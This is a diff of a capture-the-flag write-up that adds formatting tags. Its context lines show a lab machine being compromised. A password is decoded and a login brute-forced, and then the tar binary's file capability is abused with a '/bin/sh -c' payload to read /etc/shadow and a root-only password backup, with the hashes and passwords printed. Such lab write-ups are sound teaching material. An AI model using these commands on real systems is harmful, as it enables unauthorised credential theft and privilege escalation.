@@ -19,6 +19,7 @@ image:
 ```bash
 IP : 192.168.164.238
 ```
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -66,6 +67,7 @@ PORT      STATE    SERVICE    VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1374.00 seconds
 ```
+{: .nolineno}
 
 ---
 
@@ -82,6 +84,7 @@ After decoding this Brainfuck encoding I got this →
 ```bash
 .2uqPEfj3D<P'a-3
 ```
+{: .nolineno}
 
 Now I also see port 10000 and 20000 open as http-login page lets see →
 
@@ -94,6 +97,7 @@ Now after running burpsuite for username bruteforce I got this on port 20000 →
 ```bash
 cyber : .2uqPEfj3D<P'a-3
 ```
+{: .nolineno}
 
 After Getting password when I logged into the website →
 
@@ -123,6 +127,7 @@ id
 uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
 cyber@breakout:~$
 ```
+{: .nolineno}
 
 Lets see the files →
 
@@ -150,6 +155,7 @@ cat local.txt
 acff2c9656634fdd92b71c7c91d1e01c
 cyber@breakout:~$
 ```
+{: .nolineno}
 
 while checking capabilities I got tar →
 
@@ -159,6 +165,7 @@ cyber@breakout:/$ getcap -r / 2>/dev/null
 /usr/bin/ping cap_net_raw=ep
 cyber@breakout:/$
 ```
+{: .nolineno}
 
 If I can’t be root directly through executing the payload of tar into the shell so lets try to read the content of root priviledge files through this payload →
 
@@ -168,6 +175,7 @@ File read >
 LFILE=file_to_read
 tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
 ```
+{: .nolineno}
 
 ```bash
 cyber@breakout:~$ ./tar xf /etc/shadow -I '/bin/sh -c "cat 1>&2"'      
@@ -198,6 +206,7 @@ cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:
 systemd-coredump:!*:18919::::::
 cyber@breakout:~$
 ```
+{: .nolineno}
 
 Now while enumeration I also found a file named as .old.pass.bak but it has root permission so lets try to open that file →
 
@@ -216,12 +225,14 @@ drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
 -rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
 cyber@breakout:/var/backups$
 ```
+{: .nolineno}
 
 ```bash
 cyber@breakout:~$ ./tar xf /var/backups/.old_pass.bak -I '/bin/sh -c "cat 1>&2"'
 Ts&4&YurgtRX(=~h
 cyber@breakout:~$
 ```
+{: .nolineno}
 
 Now lets use this string value as a password of this root user →
 
